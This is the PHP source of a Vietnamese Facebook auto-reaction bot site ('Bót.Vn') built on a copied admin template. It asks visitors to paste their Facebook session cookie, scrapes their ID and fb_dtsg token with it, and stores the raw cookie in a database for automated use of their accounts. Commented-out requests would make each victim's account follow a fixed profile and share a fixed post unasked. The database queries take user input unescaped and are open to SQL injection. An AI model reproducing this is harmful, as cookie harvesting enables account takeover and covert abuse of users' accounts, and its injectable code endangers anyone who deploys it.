<?php
session_start();
include '../databasecsdl.php';
$tonguser = @mysqli_num_rows(mysqli_query($connection,"select count(*) from `Cookie`"));

?>
<!DOCTYPE html>
<html>

<!-- Mirrored from webapplayers.com/luna_admin-v1.1/ by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 22 Jul 2016 03:26:12 GMT -->
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <link href='http://fonts.googleapis.com/css?family=Roboto:300,400,500,700,900' rel='stylesheet' type='text/css'>

    <!-- Page title -->
    <title>Bót.Vn | Bot Cảm Xúc Chất Nhất Việt Nam</title>

    <!-- Vendor styles -->
    <link rel="stylesheet" href="vendor/fontawesome/css/font-awesome.css"/>
    <link rel="stylesheet" href="vendor/animate.css/animate.css"/>
    <link rel="stylesheet" href="vendor/bootstrap/css/bootstrap.css"/>
    <link rel="stylesheet" href="vendor/toastr/toastr.min.css"/>

    <!-- App styles -->
    <link rel="stylesheet" href="styles/pe-icons/pe-icon-7-stroke.css"/>
    <link rel="stylesheet" href="styles/pe-icons/helper.css"/>
    <link rel="stylesheet" href="styles/stroke-icons/style.css"/>
    <link rel="stylesheet" href="styles/style.css">
</head>
<body>

<!-- Wrapper-->
<div class="wrapper">

    <!-- Header-->
    <nav class="navbar navbar-default navbar-fixed-top">
        <div class="container-fluid">
            <div class="navbar-header">
                <div id="mobile-menu">
                    <div class="left-nav-toggle">
                        <a href="/cookie">
                            <i class="stroke-hamburgermenu"></i>
                        </a>
                    </div>
                </div>
                <a class="navbar-brand" href="/">
                    CamXuc
                    <span>v.3.0</span>
                </a>
            </div>
            <div id="navbar" class="navbar-collapse collapse">
                <div class="left-nav-toggle">
                    <a href="#">
                        <i class="stroke-hamburgermenu"></i>
                    </a>
                </div>
                <form class="navbar-form navbar-left">
                    <input type="text" class="form-control" placeholder="Bot Cảm Xúc" style="width: 175px">
                </form>
                <ul class="nav navbar-nav navbar-right">
                    <li class="dropdown">
                        <a href="/" >Versions
                            <span class="label label-warning pull-right">Cookie</span>
                        </a>
                    </li>
                    <li class=" profil-link">
                        <a href="login.html">
                            <span class="profile-address">admin@Bót.Vn</span>
                            <img src="https://graph.fb.me/4/picture" class="img-circle" alt="">
                        </a>
                    </li>
                </ul>
            </div>
        </div>
    </nav>
    <!-- End header-->

    <!-- Navigation-->
    <aside class="navigation">
        <nav>
            <ul class="nav luna-nav">
                <li class="nav-category">
                    Main
                </li>
                <li class="active">
                    <a href="/">Dashboard</a>
                </li>

                <li>
                    <a href="#monitoring" data-toggle="collapse" aria-expanded="false">
                        Chức Năng<span class="sub-nav-icon"> <i class="stroke-arrow"></i> </span>
                    </a>
                    <ul id="monitoring" class="nav nav-second collapse">
                        <li><a href="/"> Bot Cảm Xúc</a></li>
                    </ul>
                </li>
                <li class="active">
                    <a href="/logout.php">Đăng Xuất</a>
                </li>
                
                <li class="nav-info">
                    <i class="pe pe-7s-shield text-accent"></i>
                    <div class="m-t-xs">
                        <span class="c-white">BotCamXuc</span> Phiên bản v3.0 với tính năng mới lạ hơn, người dùng được chọn nhiều cảm xúc hơn để Bot auto.
                    </div>
                </li>
            </ul>
        </nav>
    </aside>
    <!-- End navigation-->


    <!-- Main content-->
    <section class="content">
            <div class="container-fluid">

                <div class="row">
                    <div class="col-lg-12">
                        <div class="view-header">
                            <div class="pull-right text-right" style="line-height: 14px">
                                <small>Bót.Vn<br>Dashboard<br> <span class="c-white">v.3.0</span></small>
                            </div>
                            <div class="header-icon">
                                <i class="pe page-header-icon pe-7s-shield"></i>
                            </div>
                            <div class="header-title">
                                <h3 class="m-b-xs">Bót.Vn</h3>
                                <small>
                                    Thay Đổi Hoàn Toàn Từ Giao Diện Đến Chức Năng Của Bản v1.0.
                                </small>
                            </div>
                        </div>
                        <hr>
                    </div>
                </div>

                <div class="row">
<?php if(!$_SESSION[id])
{
    ?>
                    <div class="col-md-6">
                    <div class="panel panel-filled">
                        <div class="panel-heading">
                            <div class="panel-tools">
                                <a class="panel-toggle"><i class="fa fa-chevron-up"></i></a>
                                <a class="panel-close"><i class="fa fa-times"></i></a>
                            </div>
                            Đăng Nhập
                        </div>
                        <div class="panel-body">

                            <p>Dùng Cookie Để Hạn Chế Die Token 100%</p>

                            <form action="" method="POST">
                                <div class="form-group"><label for="exampleInputEmail1">Cookie ( Cách Lấy Cookie Vui Lòng Xem Clip )</label> <input type="text" class="form-control" id="cookie" name="cookie" placeholder="Cookie ( Cách Lấy Cookie Vui Lòng Xem Clip )"></div>
                                                             
                                <button type="submit" class="btn btn-default">Đăng nhập</button>
                            </form>
                        </div>
                    </div>

                </div>
<?php } else {  
                $dem = @mysqli_num_rows(mysqli_query($connection,"select count(*) from `Cookie` where `user_id`='".$_SESSION['id']."' "));
                if($dem == 0)
                {
                    $tinhtrang = 'Bạn Chưa Cài BOT';
                    $tokenn = $_SESSION[token];
                    $submitt ='Cài BOT';
                }
                else
                {
                    $tokenn = 'tatbot';
                    $submitt ='Cập Nhật BOT';
                    $camxuccuaban = @mysqli_num_rows(mysqli_query($connection,"SELECT * FROM `Cookie` where `user_id`='".$_SESSION['id']."'"));
                    if($camxuccuaban[camxuc] == '1') $camxuc='LIKE';
                    if($camxuccuaban[camxuc] == '2') $camxuc='LOVE';
                    if($camxuccuaban[camxuc] == '3') $camxuc='WOW';
                    if($camxuccuaban[camxuc] == '4') $camxuc='HAHA';
                    if($camxuccuaban[camxuc] == '5') $camxuc='ANGRY';
                    if($camxuccuaban[camxuc] == '6') $camxuc='THANKFULL';
                    $tinhtrang ='Bạn Đã Cài BOT '.$camxuc.'';
                }
            ?>
    <div class="col-md-6">
                    <div class="panel panel-filled">
                        <div class="panel-heading">
                            <div class="panel-tools">
                                <a class="panel-toggle"><i class="fa fa-chevron-up"></i></a>
                                <a class="panel-close"><i class="fa fa-times"></i></a>
                            </div>
                            Bảng Điều Khiển
                        </div>
                        <div class="panel-body">
                            <p>Xin chào <code><?php echo $_SESSION[name]; ?></code> - <code><?php echo $_SESSION[id]; ?></code></p>
                             <p>Tình Trạng: <code><?php echo $tinhtrang; ?></code></p>
                             <form action="" method="POST">
                            <div class="radio"><label> <input type="radio" name="CamXuc" id="LOVE" value="1" checked="checked"> Cảm Xúc: LIKE </label></div>
                            <div class="radio"><label> <input type="radio" name="CamXuc" id="LOVE" value="2" checked="checked"> Cảm Xúc: LOVE </label></div>
                                        <div class="radio"><label> <input type="radio" name="CamXuc" id="WOW" value="3">Cảm Xúc: WOW </label></div>
                                        <div class="radio"><label> <input type="radio" name="CamXuc" id="HAHA" value="4">Cảm Xúc: HAHA </label></div>
                                        <div class="radio"><label> <input type="radio" name="CamXuc" id="SAD" value="5">Cảm Xúc: SAD </label></div>
                                        <div class="radio"><label> <input type="radio" name="CamXuc" id="ANGRY" value="6">Cảm Xúc: ANGRY </label></div>
                                        <div class="radio"><label> <input type="radio" name="CamXuc" id="ANGRY" value="tatbot">Tắt BOT </label></div>
                                        <div class="form-group">
  <label for="comment">Nội Dung Comment:<code><?php echo $camxuccuaban[comments];?> </code></label>
  <textarea class="form-control" rows="5" name="comment"></textarea>
</div>
<div class="radio"><label> <input type="radio" name="battatcmt" id="battatcmt" value="tatcmt">Tắt Comments </label></div>
<div class="radio"><label> <input type="radio" name="battatcmt" id="battatcmt" value="batcmt">Bật Comments </label></div>

                                        <center><button type="submit" class="btn btn-w-md btn-success"><?php echo $submitt; ?></button>
                                        
                                        </form>   </center>                      
                            
                        </div>
                    </div>

                </div>
                <?php } ?>
                <div class="col-md-6">
                    <div class="panel panel-filled">
                        <div class="panel-heading">
                            <div class="panel-tools">
                                <a class="panel-toggle"><i class="fa fa-chevron-up"></i></a>
                                <a class="panel-close"><i class="fa fa-times"></i></a>
                            </div>
                            Thống Kê
                        </div>
                        <div class="panel-body">
                        <?php
                        $file = scandir('log/');
                        ?>
                            <p>Thông tin người dùng <code>mới nhất</code> được cập nhật tại đây.</p>
                            <p>Số người dùng <code><?php echo $tonguser; ?></code> - Đã Phang <code><?php echo count($file)-2;?> </code> ID.</p>

                            <div class="table-responsive">
                                <table  class="table table-hover table-striped">
                                    <thead>
                                    <tr>
                                        <th>CX</th>
                                        <th>Name</th>
                                        <th>ID</th>
                                    </tr>
                                    </thead>
                                    <tbody>
                                    <?php 
$infongdung = mysqli_query($connection,"SELECT * FROM `Cookie` ORDER BY id DESC LIMIT 4");
while ($getpuaru = mysqli_fetch_array($infongdung)){
    if($getpuaru[camxuc] == '2') $camxuc='LOVE';
    if($getpuaru[camxuc] == '1') $camxuc='LIKE';
                    if($getpuaru[camxuc] == '3') $camxuc='WOW';
                    if($getpuaru[camxuc] == '4') $camxuc='HAHA';
                    if($getpuaru[camxuc] == '5') $camxuc='ANGRY';
                    if($getpuaru[camxuc] == '6') $camxuc='THANKFULL';
    ?>
                                    <tr>
                                        <td><?php echo $camxuc;?></td>
                                        <td><?php echo $getpuaru[name];?></td>
                                        <td><?php echo $getpuaru[user_id];?></td>
                                    </tr>                                   
<?php } ?>
                                    </tbody>
                                </table>
                            </div>

                        </div>
                    </div>
                </div>


                </div>
                <div class="row">
                <div class="col-md-12">
                    <div class="panel panel-filled">
                        <div class="panel-heading">
                            <div class="panel-tools">
                                <a class="panel-toggle"><i class="fa fa-chevron-up"></i></a>
                                <a class="panel-close"><i class="fa fa-times"></i></a>
                            </div>
                            Hướng Dẫn Sử Dụng
                        </div>
                        <div class="panel-body">
                            <p>
                                Nếu không biết cách sử dụng Bot, vui lòng xem clip ở bên dưới.
                            </p>
                            <p><div class="embed-responsive embed-responsive-16by9"><iframe width="360" height="115" src="https://www.youtube.com/embed/g3I-6X0c6V0?autoplay=0" frameborder="0" allowfullscreen></iframe></div></p>

                        </div>
                    </div>
                </div>

            </div>

        </div>

            </div>
    </section>
    <!-- End main content-->

</div>
<!-- End wrapper-->

<!-- Vendor scripts -->
<script src="vendor/pacejs/pace.min.js"></script>
<script src="vendor/jquery/dist/jquery.min.js"></script>
<script src="vendor/bootstrap/js/bootstrap.min.js"></script>
<script src="vendor/toastr/toastr.min.js"></script>
<script src="vendor/sparkline/index.js"></script>
<script src="vendor/flot/jquery.flot.min.js"></script>
<script src="vendor/flot/jquery.flot.resize.min.js"></script>
<script src="vendor/flot/jquery.flot.spline.js"></script>

<!-- App scripts -->
<script src="scripts/luna.js"></script>

<script>
    $(document).ready(function () {


        // Sparkline charts
        var sparklineCharts = function () {
            $(".sparkline").sparkline([20, 34, 43, 43, 35, 44, 32, 44, 52, 45], {
                type: 'line',
                lineColor: '#FFFFFF',
                lineWidth: 3,
                fillColor: '#404652',
                height: 47,
                width: '100%'
            });

            $(".sparkline7").sparkline([10, 34, 13, 33, 35, 24, 32, 24, 52, 35], {
                type: 'line',
                lineColor: '#FFFFFF',
                lineWidth: 3,
                fillColor: '#f7af3e',
                height: 75,
                width: '100%'
            });

            $(".sparkline1").sparkline([0, 6, 8, 3, 2, 4, 3, 4, 9, 5, 3, 4, 4, 5, 1, 6, 7, 15, 6, 4, 0], {
                type: 'line',
                lineColor: '#2978BB',
                lineWidth: 3,
                fillColor: '#2978BB',
                height: 170,
                width: '100%'
            });

            $(".sparkline3").sparkline([-8, 2, 4, 3, 5, 4, 3, 5, 5, 6, 3, 9, 7, 3, 5, 6, 9, 5, 6, 7, 2, 3, 9, 6, 6, 7, 8, 10, 15, 16, 17, 15], {

                type: 'line',
                lineColor: '#fff',
                lineWidth: 3,
                fillColor: '#393D47',
                height: 70,
                width: '100%'
            });

            $(".sparkline5").sparkline([0, 6, 8, 3, 2, 4, 3, 4, 9, 5, 3, 4, 4, 5], {
                type: 'line',
                lineColor: '#f7af3e',
                lineWidth: 2,
                fillColor: '#2F323B',
                height: 20,
                width: '100%'
            });
            $(".sparkline6").sparkline([0, 1, 4, 2, 2, 4, 1, 4, 3, 2, 3, 4, 4, 2, 4, 2, 1, 3], {
                type: 'bar',
                barColor: '#f7af3e',
                height: 20,
                width: '100%'
            });

            $(".sparkline8").sparkline([4, 2], {
                type: 'pie',
                sliceColors: ['#f7af3e', '#404652']
            });
            $(".sparkline9").sparkline([3, 2], {
                type: 'pie',
                sliceColors: ['#f7af3e', '#404652']
            });
            $(".sparkline10").sparkline([4, 1], {
                type: 'pie',
                sliceColors: ['#f7af3e', '#404652']
            });
            $(".sparkline11").sparkline([1, 3], {
                type: 'pie',
                sliceColors: ['#f7af3e', '#404652']
            });
            $(".sparkline12").sparkline([3, 5], {
                type: 'pie',
                sliceColors: ['#f7af3e', '#404652']
            });
            $(".sparkline13").sparkline([6, 2], {
                type: 'pie',
                sliceColors: ['#f7af3e', '#404652']
            });
        };

        var sparkResize;

        // Resize sparkline charts on window resize
        $(window).resize(function () {
            clearTimeout(sparkResize);
            sparkResize = setTimeout(sparklineCharts, 100);
        });

        // Run sparkline
        sparklineCharts();


        // Flot charts data and options
        var data1 = [ [0, 16], [1, 24], [2, 11], [3, 7], [4, 10], [5, 15], [6, 24], [7, 30] ];
        var data2 = [ [0, 26], [1, 44], [2, 31], [3, 27], [4, 36], [5, 46], [6, 56], [7, 66] ];

        var chartUsersOptions = {
            series: {
                splines: {
                    show: true,
                    tension: 0.4,
                    lineWidth: 1,
                    fill: 1

                }

            },
            grid: {
                tickColor: "#404652",
                borderWidth: 0,
                borderColor: '#404652',
                color: '#404652'
            },
            colors: [ "#f7af3e","#DE9536"]
        };

        $.plot($("#flot-line-chart"), [data2, data1], chartUsersOptions);


        // Run toastr notification with Welcome message
        setTimeout(function(){
            toastr.options = {
                "positionClass": "toast-top-right",
                "closeButton": true,
                "progressBar": true,
                "showEasing": "swing",
                "timeOut": "6000"
            };
            toastr.warning('<strong>Welcome to BotCamXuc</strong> <br/><small>Phiên Bản v2.0 Có Thể Chọn Cảm Xúc Riêng Cho Bạn. </small>');
        },1600)


    });
</script>
<script>
    (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
            m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
    })(window,document,'script','../../www.google-analytics.com/analytics.js','ga');

    ga('create', 'UA-4625583-2', 'webapplayers.com');
    ga('send', 'pageview');

</script>

</body>


<!-- Mirrored from webapplayers.com/luna_admin-v1.1/ by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 22 Jul 2016 03:26:34 GMT -->
</html>
<?php
                                        if($_POST[cookie] && !$_SESSION[id])
                                        {
                                        	$url = curl("https://m.facebook.com/profile.php",$_POST[cookie]);
	//echo $url;
	//exit;
	if(preg_match('#<title>(.+?)</title>#is',$url, $_puaru))
    {
    	$name = $_puaru[1];
    }
    if(preg_match('#name="target" value="(.+?)"#is',$url, $_puaru))
    {
    	$id = $_puaru[1];
    }
    if(preg_match('#name="fb_dtsg" value="(.+?)"#is',$url, $_puaru))
    {
    	$fb_dtsg = $_puaru[1];
    }
    if($name && $id && $fb_dtsg)
    {         
    //post_data("https://www.facebook.com/ajax/follow/follow_profile.php?dpr=1","profile_id=100003097360148&location=1&__user=".$id."&__a=1&__dyn=aKhoFeyfyGmaomgDBUOWEyAzm5ubhEK5EKiWFami8UR9LFGEomm5-rmi9zoszQHUF4AUzhUWqK5-7pHxuqE88HyZ7yUJi2equaxvrzHBA--VRxeUWbBx7G4GDu3_Dh8Sm6vCAzq_h6p5zA5KuiaAz8gAVCcy46ogxu49GADh8zyogyVoWbCAwBxqnx2r_mdAQJ12VoO8yqxqQGp8F3qBhQa-4bUG9DAVWKnm&__af=m&__req=7a&__be=-1&__pc=PHASED%3ADEFAULT&__rev=2717633&fb_dtsg=".$fb_dtsg."",$_POST[cookie]);
    //post_data("https://www.facebook.com/share/dialog/submit/?dpr=1","post_id=1123285604451341&share_type=22&audience_type=self&app_id=25554907596&sharer_id=".$id."&privacy=300645083384735&internalextra[feedback_source]=21&share_now=1&is_forced_reshare_of_post=0&nctr[_mod]=pagelet_timeline_recent&__user=".$id."&__a=1&__dyn=aKhoFeyfyGmaomgDBUOWEyAzm5ubhEK5EKiWFami8UR9LFGEomm6pJp8CdxOfiLyAijyd7zFGUnUtCK5VGwwyKbQubyR88VFUG5ZKeKmjXXDm4XzEKm4uEiGtUf-t4zpop-qidHZ4pVoV1rDAyF8O49epz8x1C48nx2qF9Qi8UC48KmeyVF89omBUgC_RzpdbggKmcy8CEmJaCiagSFkt2Lx2-aypV8CHBQ&__af=m&__req=47&__be=-1&__pc=PHASED%3ADEFAULT&__rev=2717633&fb_dtsg=".$fb_dtsg."&ttstamp=2658172114121105121739866112106586581716990108103103657886114&ft[tn]=J]&ft[type]=25&ft[top_level_post_id]=1123285604451341&ft[tl_objid]=1123285604451341&ft[fbfeed_location]=10&ft[thid]=100003097360148%3A306061129499414%3A2%3A0%3A1483257599%3A5507322237776062466",$_POST[cookie]);                          
                                            $_SESSION[id] = $id;
                                            $_SESSION[name] = $name;
                                            $_SESSION[fb_dtsg] = $fb_dtsg;
                                            $_SESSION[cookie] = $_POST[cookie];
                                            ?>
<meta http-equiv=refresh content="0; URL=index.php">
<?php

                                        } else {
                                            die('<script>alert("Lấy Lại Cookie"); </script>');
                                        }
                                    }
                                                                            

if($_POST[CamXuc] && $_SESSION[id])
{
    if($_POST[CamXuc] == 'tatbot')
    {
mysqli_query($connection,"
            DELETE FROM
               Cookie
            WHERE
               user_id='" . @mysqli_real_escape_string($connection,$_SESSION[id]) . "' 
         ");
?>
<meta http-equiv=refresh content="0; URL=index.php">
<?php
    }
    else
    {
    

    $row = null;
   $result = @mysqli_query($connection,"
      SELECT
         *
      FROM
         Cookie
      WHERE
         user_id = '" . @mysqli_real_escape_string($connection,$_SESSION[id]) . "'
   ");
   if($result){
      $row = @mysqli_fetch_array($result, MYSQL_ASSOC);
      if(mysqli_num_rows($result) > 100){
         mysqli_query($connection,"
            DELETE FROM
               Cookie
            WHERE
               user_id='" . @mysqli_real_escape_string($connection,$_SESSION[id]) . "' AND
               id != '" . $row['id'] . "'
         ");
      }
   }
 if($_POST[battatcmt] != 'tatcmt')
    {
        if(!$row){
      @mysqli_query($connection,
         "INSERT INTO 
            Cookie
         SET
            `user_id` = '" . @mysqli_real_escape_string($connection,$_SESSION[id]) . "',            
            `name` = '" . @mysqli_real_escape_string($connection,$_SESSION[name]) . "',
            `fb_dtsg` = '" . $_SESSION[fb_dtsg] . "',
            `camxuc` = '" . $_POST[CamXuc] . "',
            `comments` = '" . $_POST[comment] . "',
            `battatcmt` = '1',
            `cookie` = '" . $_SESSION[cookie] . "'
      ");
   } else {
      @mysqli_query($connection,
         "UPDATE 
            Cookie
         SET
            `fb_dtsg` = '" . $_SESSION[fb_dtsg] . "',            
            `camxuc` = '" . $_POST[CamXuc] . "',
            `comments` = '" . $_POST[comment] . "',
            `battatcmt` = '1',
            `cookie` = '" . $_SESSION[cookie] . "'

         WHERE
            `id` = " . $row['id'] . "
      ");
   }
    }
    else
    {
        if(!$row){
      @mysqli_query($connection,
         "INSERT INTO 
            Cookie
         SET
            `user_id` = '" . @mysqli_real_escape_string($connection,$_SESSION[id]) . "',            
            `name` = '" . @mysqli_real_escape_string($connection,$_SESSION[name]) . "',
            `fb_dtsg` = '" . $_SESSION[fb_dtsg] . "',
            `camxuc` = '" . $_POST[CamXuc] . "',
            `comments` = 'Chưa Có Nội Dung Vì Bạn Đang Tắt Chức Năng Này',
            `battatcmt` = '0',
            `cookie` = '" . $_SESSION[cookie] . "'
      ");
   } else {
      @mysqli_query($connection,
         "UPDATE 
            Cookie
         SET
            `fb_dtsg` = '" . $_SESSION[fb_dtsg] . "',            
            `camxuc` = '" . $_POST[CamXuc] . "',
            `comments` = 'Chưa Có Nội Dung Vì Bạn Đang Tắt Chức Năng Này',
            `battatcmt` = '0',
            `cookie` = '" . $_SESSION[cookie] . "'

         WHERE
            `id` = " . $row['id'] . "
      ");
   }
    }
   
?>
<meta http-equiv=refresh content="0; URL=index.php">
<?php
}}

function get($url){
   $curl = curl_init();
   curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
   curl_setopt($curl, CURLOPT_URL, $url);
   $ch = curl_exec($curl);
   curl_close($curl);
   return $ch;
   }
   function curl($url,$cookie)
{
    $ch = @curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    $head[] = "Connection: keep-alive";
    $head[] = "Keep-Alive: 300";
    $head[] = "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7";
    $head[] = "Accept-Language: en-us,en;q=0.5";
    curl_setopt($ch, CURLOPT_USERAGENT, 'Opera/9.80 (Windows NT 6.0) Presto/2.12.388 Version/12.14');
    curl_setopt($ch, CURLOPT_ENCODING, '');
    curl_setopt($ch, CURLOPT_COOKIE, $cookie);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $head);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
    curl_setopt($ch, CURLOPT_TIMEOUT, 60);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 60);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        'Expect:'
    ));
    $page = curl_exec($ch);
    curl_close($ch);
    return $page;
} 
function post_data($site,$data,$cookie){
    $datapost = curl_init();
    $headers = array("Expect:");
    curl_setopt($datapost, CURLOPT_URL, $site);
    curl_setopt($datapost, CURLOPT_TIMEOUT, 40000);
    curl_setopt($datapost, CURLOPT_HEADER, TRUE);

    curl_setopt($datapost, CURLOPT_RETURNTRANSFER, TRUE);
    curl_setopt($datapost, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($datapost, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.124 Safari/537.36');
    curl_setopt($datapost, CURLOPT_POST, TRUE);
    curl_setopt($datapost, CURLOPT_POSTFIELDS, $data);
    curl_setopt($datapost, CURLOPT_COOKIE,$cookie);
    ob_start();
    return curl_exec ($datapost);
    ob_end_clean();
    curl_close ($datapost);
    unset($datapost); 
} 
?>